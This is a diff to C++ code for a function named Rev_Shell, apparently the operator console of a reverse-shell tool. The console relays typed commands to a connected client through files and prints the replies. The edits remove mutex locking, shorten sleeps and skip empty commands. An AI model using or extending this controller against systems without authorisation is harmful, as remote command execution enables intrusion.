@@ -400,12 +400,14 @@ int Rev_Shell(SOCKET &clientSocket)
         {
             //{
                 //lock_guard<mutex> lock1(socketMutex);
-                mtx.lock();
+                //mtx.lock();
+                Sleep(100);
 
                 if(receive_data(clientSocket,"from_client.txt")[0] == '`')
                 {
-                    Sleep(1000);
-                    cout<< "waiting for rev shell data " << endl;
+                    
+                    //cout<< "waiting for rev shell data " << endl;
+                    continue;
                 }
                 else 
                 {
@@ -416,9 +418,9 @@ int Rev_Shell(SOCKET &clientSocket)
                     cout << data << endl;
                 }
             
-                mtx.unlock();
+                //mtx.unlock();
             //}
-            Sleep(1000);                                                                            // Sleep for a short time to prevent 100% CPU usage
+            Sleep(100);                                                                            // Sleep for a short time to prevent 100% CPU usage
         }
     });
 
@@ -429,21 +431,22 @@ int Rev_Shell(SOCKET &clientSocket)
         {
             //{
                 //lock_guard<mutex> lock1(socketMutex);
-                mtx.lock();
+                //mtx.lock();
 
                 if (getline(cin, cmd))                                                                  //getline to allow multi-word commands
                 {
                     if (cmd == "exit")
                     {
                         send_data(clientSocket, "from_server.txt" ,"exit");
+                        
                         processFinished.store(true);
                         break;
                     }
-                    send_data(clientSocket, "from_server.txt" ,cmd);
+                    if(!cmd.empty()) send_data(clientSocket, "from_server.txt" ,cmd);
                 }
-                mtx.unlock();
+                //mtx.unlock();
             //}
-            Sleep(1000);
+            Sleep(100);
         }
     });
 
